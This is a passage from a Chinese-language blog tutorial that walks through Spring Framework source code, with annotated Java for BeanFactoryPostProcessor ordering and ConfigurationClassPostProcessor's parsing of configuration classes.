class="comment">//调用没有实现任何优先级接口的BeanDefinitionRegistryPostProcessor</span></span><br><span class="line">        <span class="comment">//定义一个重复处理的开关变量 默认值为true</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">reiterate</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="comment">//第一次就可以进来</span></span><br><span class="line">        <span class="keyword">while</span> (reiterate) &#123;</span><br><span class="line">            <span class="comment">//进入循环马上把开关变量给改为false</span></span><br><span class="line">            reiterate = <span class="literal">false</span>;</span><br><span class="line">            <span class="comment">//去容器中获取BeanDefinitionRegistryPostProcessor的bean的处理器名称</span></span><br><span class="line">            postProcessorNames = beanFactory.getBeanNamesForType(BeanDefinitionRegistryPostProcessor.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="comment">//循环上一步获取的BeanDefinitionRegistryPostProcessor的类型名称</span></span><br><span class="line">            <span class="keyword">for</span> (String ppName : postProcessorNames) &#123;</span><br><span class="line">                <span class="comment">//没有被处理过的</span></span><br><span class="line">                <span class="keyword">if</span> (!processedBeans.contains(ppName)) &#123;</span><br><span class="line">                    <span class="comment">//显示的调用getBean()的方式获取出该对象然后加入到currentRegistryProcessors集合中去</span></span><br><span class="line">                    currentRegistryProcessors.add(beanFactory.getBean(ppName, BeanDefinitionRegistryPostProcessor.class));</span><br><span class="line">                    <span class="comment">//同时也加入到processedBeans集合中去</span></span><br><span class="line">                    processedBeans.add(ppName);</span><br><span class="line">                    <span class="comment">//再次设置为true</span></span><br><span class="line">                    reiterate = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//对currentRegistryProcessors集合中BeanDefinitionRegistryPostProcessor进行排序</span></span><br><span class="line">            sortPostProcessors(currentRegistryProcessors, beanFactory);</span><br><span class="line">            <span class="comment">//把他加入到用于保存到registryProcessors中</span></span><br><span class="line">            registryProcessors.addAll(currentRegistryProcessors);</span><br><span class="line">            <span class="comment">//调用他的后置处理方法</span></span><br><span class="line">            invokeBeanDefinitionRegistryPostProcessors(currentRegistryProcessors, registry);</span><br><span class="line">            <span class="comment">//进行clear</span></span><br><span class="line">            currentRegistryProcessors.clear();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//------------调用没有实现任何优先级接口自定义BeanDefinitionRegistryPostProcessor完毕--End-----</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用 BeanDefinitionRegistryPostProcessor.postProcessBeanFactory方法</span></span><br><span class="line">        invokeBeanFactoryPostProcessors(registryProcessors, beanFactory);</span><br><span class="line">        <span class="comment">//调用BeanFactoryPostProcessor 自设的（没有）</span></span><br><span class="line">        invokeBeanFactoryPostProcessors(regularPostProcessors, beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//若当前的beanFactory没有实现了BeanDefinitionRegistry 说明没有注册Bean定义的能力</span></span><br><span class="line">        <span class="comment">// 那么就直接调用BeanDefinitionRegistryPostProcessor.postProcessBeanFactory方法</span></span><br><span class="line">        invokeBeanFactoryPostProcessors(beanFactoryPostProcessors, beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//---------------所有BeanDefinitionRegistryPostProcessor调用完毕--End----------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//--------------------------处理BeanFactoryPostProcessor --Begin--------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取容器中所有的 BeanFactoryPostProcessor</span></span><br><span class="line">    String[] postProcessorNames =</span><br><span class="line">        beanFactory.getBeanNamesForType(BeanFactoryPostProcessor.class, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存BeanFactoryPostProcessor类型实现了priorityOrdered</span></span><br><span class="line">    List&lt;BeanFactoryPostProcessor&gt; priorityOrderedPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//保存BeanFactoryPostProcessor类型实现了Ordered接口的</span></span><br><span class="line">    List&lt;String&gt; orderedPostProcessorNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">//保存BeanFactoryPostProcessor没有实现任何优先级接口的</span></span><br><span class="line">    List&lt;String&gt; nonOrderedPostProcessorNames = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String ppName : postProcessorNames) &#123;</span><br><span class="line">        <span class="comment">//processedBeans包含的话，表示在上面处理BeanDefinitionRegistryPostProcessor的时候处理过了</span></span><br><span class="line">        <span class="keyword">if</span> (processedBeans.contains(ppName)) &#123;</span><br><span class="line">            <span class="comment">// skip - already processed in first phase above</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断是否实现了PriorityOrdered 优先级最高</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (beanFactory.isTypeMatch(ppName, PriorityOrdered.class)) &#123;</span><br><span class="line">            priorityOrderedPostProcessors.add(beanFactory.getBean(ppName, BeanFactoryPostProcessor.class));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断是否实现了Ordered  优先级 其次</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (beanFactory.isTypeMatch(ppName, Ordered.class)) &#123;</span><br><span class="line">            orderedPostProcessorNames.add(ppName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//没有实现任何的优先级接口的  最后调用</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            nonOrderedPostProcessorNames.add(ppName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//  排序</span></span><br><span class="line">    sortPostProcessors(priorityOrderedPostProcessors, beanFactory);</span><br><span class="line">    <span class="comment">// 先调用BeanFactoryPostProcessor实现了 PriorityOrdered接口的</span></span><br><span class="line">    invokeBeanFactoryPostProcessors(priorityOrderedPostProcessors, beanFactory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//再调用BeanFactoryPostProcessor实现了 Ordered.</span></span><br><span class="line">    List&lt;BeanFactoryPostProcessor&gt; orderedPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String postProcessorName : orderedPostProcessorNames) &#123;</span><br><span class="line">        orderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));</span><br><span class="line">    &#125;</span><br><span class="line">    sortPostProcessors(orderedPostProcessors, beanFactory);</span><br><span class="line">    invokeBeanFactoryPostProcessors(orderedPostProcessors, beanFactory);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用没有实现任何方法接口的</span></span><br><span class="line">    List&lt;BeanFactoryPostProcessor&gt; nonOrderedPostProcessors = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String postProcessorName : nonOrderedPostProcessorNames) &#123;</span><br><span class="line">        nonOrderedPostProcessors.add(beanFactory.getBean(postProcessorName, BeanFactoryPostProcessor.class));</span><br><span class="line">    &#125;</span><br><span class="line">    invokeBeanFactoryPostProcessors(nonOrderedPostProcessors, beanFactory);</span><br><span class="line">    <span class="comment">//--------------------------处理BeanFactoryPostProcessor --End----------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Clear cached merged bean definitions since the post-processors might have</span></span><br><span class="line">    <span class="comment">// modified the original metadata, e.g. replacing placeholders in values...</span></span><br><span class="line">    beanFactory.clearMetadataCache();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//---- BeanFactoryPostProcessor和BeanDefinitionRegistryPostProcessor调用完毕 --End---------</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个方法稍微有点长，其中设计到Bean工厂后置处理器的执行顺序如下：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/05/13/xUqtjkP82VNcn4l.jpg"
                      alt="Screenshot_79.jpg"
                ></p>
<h3 id="解析配置类"><a href="#解析配置类" class="headerlink" title="解析配置类"></a>解析配置类</h3><p>介绍完了Bean工厂的后置处理器的执行顺序，我们就详细介绍ConfigurationClassPostProcessor后置处理器解析配置类的执行流程。</p>
<p>ConfigurationClassPostProcessor是Spring中唯一实现了PriorityOrdered接口的内置Bean工厂后置处理器，所以它会第一个被调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">invokeBeanDefinitionRegistryPostProcessors</span><span class="params">(</span></span><br><span class="line"><span class="params">		Collection&lt;? extends BeanDefinitionRegistryPostProcessor&gt; postProcessors, BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">	<span class="comment">//获取容器中的ConfigurationClassPostProcessor的后置处理器进行bean定义的扫描</span></span><br><span class="line">	<span class="keyword">for</span> (BeanDefinitionRegistryPostProcessor postProcessor : postProcessors) &#123;</span><br><span class="line">           <span class="comment">//在这里再调用处理</span></span><br><span class="line">		postProcessor.postProcessBeanDefinitionRegistry(registry);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">postProcessBeanDefinitionRegistry</span><span class="params">(BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">	<span class="type">int</span> <span class="variable">registryId</span> <span class="operator">=</span> System.identityHashCode(registry);</span><br><span class="line">       <span class="comment">//这里都是进行一些判断 不太重要</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">this</span>.registriesPostProcessed.contains(registryId)) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">				<span class="string">&quot;postProcessBeanDefinitionRegistry already called on this post-processor against &quot;</span> + registry);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">this</span>.factoriesPostProcessed.contains(registryId)) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">				<span class="string">&quot;postProcessBeanFactory already called on this post-processor against &quot;</span> + registry);</span><br><span class="line">	&#125;</span><br><span class="line">   </span><br><span class="line">	<span class="built_in">this</span>.registriesPostProcessed.add(registryId);</span><br><span class="line">	<span class="comment">//真正的解析我们的bean定义</span></span><br><span class="line">	processConfigBeanDefinitions(registry);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在我们认真看它内部的处理方式</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processConfigBeanDefinitions</span><span class="params">(BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">	List&lt;BeanDefinitionHolder&gt; configCandidates = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">       </span><br><span class="line">	<span class="comment">//获取IOC 容器中目前所有bean定义的名称</span></span><br><span class="line">	String[] candidateNames = registry.getBeanDefinitionNames();</span><br><span class="line"></span><br><span class="line">	<span class="comment">//循环我们的上一步获取的所有的bean定义信息</span></span><br><span class="line">	<span class="keyword">for</span> (String beanName : candidateNames) &#123;</span><br><span class="line">		<span class="comment">//通过bean的名称来获取我们的bean定义对象</span></span><br><span class="line">		<span class="type">BeanDefinition</span> <span class="variable">beanDef</span> <span class="operator">=</span> registry.getBeanDefinition(beanName);</span><br><span class="line">		<span class="comment">//判断是否有没有解析过</span></span><br><span class="line">		<span class="keyword">if</span> (ConfigurationClassUtils.isFullConfigurationClass(beanDef) ||</span><br><span class="line">				ConfigurationClassUtils.isLiteConfigurationClass(beanDef)) &#123;</span><br><span class="line">			<span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">				logger.debug(<span class="string">&quot;Bean definition has already been processed as a configuration class: &quot;</span> + beanDef);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">           </span><br><span class="line">		<span class="comment">//进行正在的解析判断是不是完全的配置类 还是一个非正式的配置类</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (ConfigurationClassUtils.checkConfigurationClassCandidate(beanDef, <span class="built_in">this</span>.metadataReaderFactory)) &#123;</span><br><span class="line">			<span class="comment">//满足添加 就加入到候选的配置类集合中</span></span><br><span class="line">			configCandidates.add(<span class="keyword">new</span> <span class="title class_">BeanDefinitionHolder</span>(beanDef, beanName));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 若没有找到配置类 直接返回</span></span><br><span class="line">	<span class="keyword">if</span> (configCandidates.isEmpty()) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//对我们的配置类进行Order排序</span></span><br><span class="line">	configCandidates.sort((bd1, bd2) -&gt; &#123;</span><br><span class="line">		<span class="type">int</span> <span class="variable">i1</span> <span class="operator">=</span> ConfigurationClassUtils.getOrder(bd1.getBeanDefinition());</span><br><span class="line">		<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> ConfigurationClassUtils.getOrder(bd2.getBeanDefinition());</span><br><span class="line">		<span class="keyword">return</span> Integer.compare(i1, i2);</span><br><span class="line">	&#125;);</span><br><span class="line">       <span class="comment">//==========================================================================</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建我们通过@CompentScan导入进来的bean name的生成器</span></span><br><span class="line">	<span class="comment">// 创建我们通过@Import导入进来的bean的名称</span></span><br><span class="line">	<span class="type">SingletonBeanRegistry</span> <span class="variable">sbr</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">if</span> (registry <span class="keyword">instanceof</span> SingletonBeanRegistry) &#123;</span><br><span class="line">		sbr = (SingletonBeanRegistry) registry;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">this</span>.localBeanNameGeneratorSet) &#123;</span><br><span class="line">			<span class="type">BeanNameGenerator</span> <span class="variable">generator</span> <span class="operator">=</span> (BeanNameGenerator) sbr.getSingleton(CONFIGURATION_BEAN_NAME_GENERATOR);</span><br><span class="line">			<span class="keyword">if</span> (generator != <span class="literal">null</span>) &#123;</span><br><span class="line">				<span class="comment">//设置@CompentScan导入进来的bean的名称生成器(默认类首字母小写）也可以自己定义，一般不会</span></span><br><span class="line">				<span class="built_in">this</span>.componentScanBeanNameGenerator = generator;</span><br><span class="line">				<span class="comment">//设置@Import导入进来的bean的名称生成器(默认类首字母小写）也可以自己定义，一般不会</span></span><br><span class="line">				<span class="built_in">this</span>.importBeanNameGenerator = generator;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">this</span>.environment == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="built_in">this</span>.environment = <span class="keyword">new</span> <span class="title class_">StandardEnvironment</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建一个配置类解析器对象</span></span><br><span class="line">	<span class="type">ConfigurationClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConfigurationClassParser</span>(</span><br><span class="line">			<span class="built_in">this</span>.metadataReaderFactory, <span class="built_in">this</span>.problemReporter, <span class="built_in">this</span>.environment,</span><br><span class="line">			<span class="built_in">this</span>.resourceLoader, <span class="built_in">this</span>.componentScanBeanNameGenerator, registry);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//用于保存我们的配置类BeanDefinitionHolder放入上面筛选出来的配置类</span></span><br><span class="line">	Set&lt;BeanDefinitionHolder&gt; candidates = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;(configCandidates);</span><br><span class="line">	<span class="comment">//用于保存我们的已经解析的配置类，长度默认为解析出来默认的配置类的集合长度</span></span><br><span class="line">	Set&lt;ConfigurationClass&gt; alreadyParsed = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(configCandidates.size());</span><br><span class="line"></span><br><span class="line">	<span class="comment">//do while 会进行第一次解析</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="comment">//真正的解析我们的配置类</span></span><br><span class="line">           <span class="comment">//！！！！！！！！！！！</span></span><br><span class="line">		parser.parse(candidates);</span><br><span class="line">		parser.validate();</span><br><span class="line"></span><br><span class="line">		<span class="comment">//解析出来的配置类</span></span><br><span class="line">		Set&lt;ConfigurationClass&gt; configClasses = <span class="keyword">new</span> <span class="title class_">LinkedHashSet</span>&lt;&gt;(parser.getConfigurationClasses());</span><br><span class="line">		configClasses.removeAll(alreadyParsed);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Read the model and create bean definitions based on its content</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">this</span>.reader == <span class="literal">null</span>) &#123;</span><br><span class="line">			<span class="built_in">this</span>.reader = <span class="keyword">new</span> <span class="title class_">ConfigurationClassBeanDefinitionReader</span>(</span><br><span class="line">					registry, <span class="built_in">this</span>.sourceExtractor, <span class="built_in">this</span>.resourceLoader, <span class="built_in">this</span>.environment,</span><br><span class="line">					<span class="built_in">this</span>.importBeanNameGenerator, parser.getImportRegistry());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// 此处才把@Bean的方法和@Import 注册到BeanDefinitionMap中</span></span><br><span class="line">		<span class="built_in">this</span>.reader.loadBeanDefinitions(configClasses);</span><br><span class="line">		<span class="comment">//加入到已经解析的集合中</span></span><br><span class="line">		alreadyParsed.addAll(configClasses);</span><br><span class="line"></span><br><span class="line">		candidates.clear();</span><br><span class="line">		<span class="comment">//判断我们ioc容器中的是不是&gt;候选原始的bean定义的个数</span></span><br><span class="line">		<span class="keyword">if</span> (registry.getBeanDefinitionCount() &gt; candidateNames.length) &#123;</span><br><span class="line">			<span class="comment">//获取所有的bean定义</span></span><br><span class="line">			String[] newCandidateNames = registry.getBeanDefinitionNames();</span><br><span class="line">			<span class="comment">//原始的老的候选的bean定义</span></span><br><span class="line">			Set&lt;String&gt; oldCandidateNames = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;(Arrays.asList(candidateNames));</span><br><span class="line">			Set&lt;String&gt; alreadyParsedClasses = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">			<span class="comment">//赋值已经解析的</span></span><br><span class="line">			<span class="keyword">for</span> (ConfigurationClass configurationClass : alreadyParsed) &#123;</span><br><span class="line">				alreadyParsedClasses.add(configurationClass.getMetadata().getClassName());</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (String candidateName : newCandidateNames) &#123;</span><br><span class="line">				<span class="comment">//表示当前循环的还没有被解析过</span></span><br><span class="line">				<span class="keyword">if</span> (!oldCandidateNames.contains(candidateName)) &#123;</span><br><span class="line">					<span class="type">BeanDefinition</span> <span class="variable">bd</span> <span class="operator">=</span> registry.getBeanDefinition(candidateName);</span><br><span class="line">					<span class="comment">//判断有没有被解析过</span></span><br><span class="line">					<span class="keyword">if</span> (ConfigurationClassUtils.checkConfigurationClassCandidate(bd, <span class="built_in">this</span>.metadataReaderFactory) &amp;&amp;</span><br><span class="line">							!alreadyParsedClasses.contains(bd.getBeanClassName())) &#123;</span><br><span class="line">						candidates.add(<span class="keyword">new</span> <span class="title class_">BeanDefinitionHolder</span>(bd, candidateName));</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			candidateNames = newCandidateNames;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//存在没有解析过的 需要循环解析</span></span><br><span class="line">	<span class="keyword">while</span> (!candidates.isEmpty());</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Register the ImportRegistry as a bean in order to support ImportAware @Configuration classes</span></span><br><span class="line">	<span class="keyword">if</span> (sbr != <span class="literal">null</span> &amp;&amp; !sbr.containsSingleton(IMPORT_REGISTRY_BEAN_NAME)) &#123;</span><br><span class="line">		sbr.registerSingleton(IMPORT_REGISTRY_BEAN_NAME, parser.getImportRegistry());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">this</span>.metadataReaderFactory <span class="keyword">instanceof</span> CachingMetadataReaderFactory) &#123;</span><br><span class="line">		<span class="comment">// Clear cache in externally provided MetadataReaderFactory; this is a no-op</span></span><br><span class="line">		<span class="comment">// for a shared cache since it&#x27;ll be cleared by the ApplicationContext.</span></span><br><span class="line">		((CachingMetadataReaderFactory) <span class="built_in">this</span>.metadataReaderFactory).clearCache();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面方法的主要逻辑大致如下：</p>
<ol>
<li>遍历Bean定义，获取所有配置类的Bean定义，并且根据是否加上@Configuration注解给其Bean定义添加<code>Full</code>或<code>Lite</code>属性。</li>
<li>通过ConfigurationClassParser的<code>parse</code>方法解析配置类，这是核心。</li>
<li>解析完后，如果发现解析出来了新的Bean定义，那么需要重复第 1 步直到所有的Bean都解析完成。</li>
</ol>
<p>下面我们就跟进到ConfigurationClassParser的<code>parse</code>方法，看看如何解析配置类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">parse</span><span class="params">(Set&lt;BeanDefinitionHolder&gt; configCandidates)</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">	* 用于来保存延时的ImportSelectors，最最最著名的代表就是我们的SpringBoot自动装配的的类</span></span><br><span class="line"><span class="comment">    * AutoConfigurationImportSelector</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    <span class="built_in">this</span>.deferredImportSelectors = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 循环配置类</span></span><br><span class="line">    <span class="keyword">for</span> (BeanDefinitionHolder holder : configCandidates) &#123;</span><br><span class="line">        <span class="type">BeanDefinition</span> <span class="variable">bd</span> <span class="operator">=</span> holder.getBeanDefinition();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//真正的解析我们的bean定义 :通过注解元数据 解析</span></span><br><span class="line">            <span class="keyword">if</span> (bd <span class="keyword">instanceof</span> AnnotatedBeanDefinition) &#123;</span><br><span class="line">                parse(((AnnotatedBeanDefinition) bd).getMetadata(), holder.getBeanName());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (bd <span class="keyword">instanceof</span> AbstractBeanDefinition &amp;&amp; ((AbstractBeanDefinition) bd).hasBeanClass()) &#123;</span><br><span class="line">                parse(((AbstractBeanDefinition) bd).getBeanClass(), holder.getBeanName());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                parse(bd.getBeanClassName(), holder.getBeanName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (BeanDefinitionStoreException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">BeanDefinitionStoreException</span>(</span><br><span class="line">                <span class="string">&quot;Failed to parse configuration class [&quot;</span> + bd.getBeanClassName() + <span class="string">&quot;]&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//处理我们延时的DeferredImportSelectors w我们springboot就是通过这步进行记载spring.factories文件中的自定装配的对象</span></span><br><span class="line">    processDeferredImportSelectors();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">parse</span><span class="params">(AnnotationMetadata metadata, String beanName)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">	* 第一步:把我们的配置类源信息和beanName包装成一个ConfigurationClass 对象</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    processConfigurationClass(<span class="keyword">new</span> <span class="title class_">ConfigurationClass</span>(metadata, beanName));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">processConfigurationClass</span><span class="params">(ConfigurationClass configClass)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    ......</span><br><span class="line">        <span class="comment">// Recursively process the configuration class and its superclass hierarchy.递归处理配置类及其超类层次结构。</span></span><br><span class="line">        <span class="type">SourceClass</span> <span class="variable">sourceClass</span> <span class="operator">=</span> asSourceClass(configClass);</span><br><span class="line">    <span class="comment">//真正的进行配置类的解析</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">//解析我们的配置类</span></span><br><span class="line">        sourceClass = doProcessConfigurationClass(configClass, sourceClass);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (sourceClass != <span class="literal">null</span>);</span><br><span class="line">    <span class="comment">// 这里把解析出来的SourceClass放入configurationClasses中</span></span><br><span class="line">    <span class="comment">// 主要是@Import、@Bean、@ImportRosource等没有注册的Bean</span></span><br><span class="line">    <span class="built_in">this</span>.configurationClasses.put(configClass, configClass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>层层向下，终于到了解析配置类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> SourceClass <span class="title function_">doProcessConfigurationClass</span><span class="params">(ConfigurationClass configClass, SourceClass sourceClass)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 这里终于开始解析配置类了，顺序如下：</span></span><br><span class="line">    <span class="comment">// @PropertySources-@ComponentScan-@Import-@ImportResource-@Bean</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Recursively process any member (nested) classes first</span></span><br><span class="line">    processMemberClasses(configClass, sourceClass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//处理我们的@propertySource注解的</span></span><br><span class="line">    <span class="keyword">for</span> (AnnotationAttributes propertySource : AnnotationConfigUtils.attributesForRepeatable(</span><br><span class="line">        sourceClass.getMetadata(), PropertySources.class,</span><br><span class="line">        org.springframework.context.annotation.PropertySource.class)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.environment <span class="keyword">instanceof</span> ConfigurableEnvironment) &#123;</span><br><span class="line">            processPropertySource(propertySource);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            logger.warn(<span class="string">&quot;Ignoring @PropertySource annotation on [&quot;</span> + sourceClass.getMetadata().getClassName() +</span><br><span class="line">                        <span class="string">&quot;]. Reason: Environment must implement ConfigurableEnvironment&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//解析我们的 @ComponentScan 注解</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//从我们的配置类上解析处ComponentScans的对象集合属性</span></span><br><span class="line">    Set&lt;AnnotationAttributes&gt; componentScans = AnnotationConfigUtils.attributesForRepeatable(</span><br><span class="line">        sourceClass.getMetadata(), ComponentScans.class, ComponentScan.class);</span><br><span class="line">    <span class="comment">//开始判断是否有这个属性，有的话就解析</span></span><br><span class="line">    <span class="keyword">if</span> (!componentScans.isEmpty() &amp;&amp;</span><br><span class="line">        !<span class="built_in">this</span>.conditionEvaluator.shouldSkip(sourceClass.getMetadata(), ConfigurationPhase.REGISTER_BEAN)) &#123;</span><br><span class="line">        <span class="comment">//循环解析 我们解析出来的AnnotationAttributes</span></span><br><span class="line">        <span class="keyword">for</span> (AnnotationAttributes componentScan : componentScans) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//把我们扫描出来的类变为bean定义的集合 真正的解析</span></span><br><span class="line">            <span class="comment">//这里是@ComponentScan注解的核心</span></span><br><span class="line">            Set&lt;BeanDefinitionHolder&gt; scannedBeanDefinitions =</span><br><span class="line">                <span class="built_in">this</span>.componentScanParser.parse(componentScan, sourceClass.getMetadata().getClassName());</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取到了扫描后的Bean定义</span></span><br><span class="line">            <span class="comment">//循环处理我们包扫描出来的bean定义</span></span><br><span class="line">            <span class="keyword">for</span> (BeanDefinitionHolder holder : scannedBeanDefinitions) &#123;</span><br><span class="line">                <span class="comment">//获取Bean定义</span></span><br><span class="line">                <span class="type">BeanDefinition</span> <span class="variable">bdCand</span> <span class="operator">=</span> holder.getBeanDefinition().getOriginatingBeanDefinition();</span><br><span class="line">                <span class="comment">//判断空</span></span><br><span class="line">                <span class="keyword">if</span> (bdCand == <span class="literal">null</span>) &#123;</span><br><span class="line">                    bdCand = holder.getBeanDefinition();</span><br><span class="line">                &#125;</span><br><span class="line">                <span 